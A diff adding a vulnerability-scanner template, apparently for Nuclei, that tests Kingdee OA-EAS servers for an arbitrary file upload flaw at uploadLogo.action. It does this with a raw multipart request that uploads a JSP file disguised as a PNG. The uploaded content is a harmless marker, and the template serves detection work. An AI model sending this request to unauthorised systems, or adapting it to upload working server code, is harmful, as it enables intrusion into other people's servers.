@@ -1,0 +1,56 @@
+id: jindieOA-uploadLogo-action-file-upload
+info:
+  name: 金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞
+  author: cnaq
+  severity: critical
+  description: 金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6OA-EAS%E7%B3%BB%E7%BB%9F%20uploadLogo.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: weaver,rce
+
+requests:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        X-Forwarded-For: 
+        Content-Length: 632
+        Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
+
+        ch
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
+
+        xx
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="insId"; filename="insId"
+
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="type"; filename="type"
+
+        top
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="upload"; filename="test1313.jsp"
+        Content-Type: image/png
+
+        test1313
+        --04844569c7ca7d21a3ca115dca477d62--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - 'success'
